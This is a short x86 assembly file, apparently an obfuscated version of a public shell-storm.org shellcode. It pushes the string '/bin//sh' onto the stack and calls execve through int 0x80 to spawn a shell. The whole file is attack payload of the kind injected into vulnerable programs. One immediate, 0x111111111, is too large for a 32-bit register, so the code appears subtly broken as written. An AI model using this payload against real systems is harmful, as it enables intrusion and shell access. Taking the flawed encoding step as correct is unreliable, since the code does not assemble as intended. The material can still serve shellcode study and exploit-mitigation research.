; http://shell-storm.org/shellcode/files/shellcode-811.php
global _start
section .text
_start:
	xor ecx, ecx
	mul ecx
	sub esp, 0xc
	mov dword[esp+0x8], ecx
	mov edx,0x57621e1e
	add edx,0x111111111
	mov dword[esp+0x4], edx
	mov edx, ecx
	mov dword[esp],0x6e69622f
	mov ebx, esp
	mov al, 0xb
	int 0x80
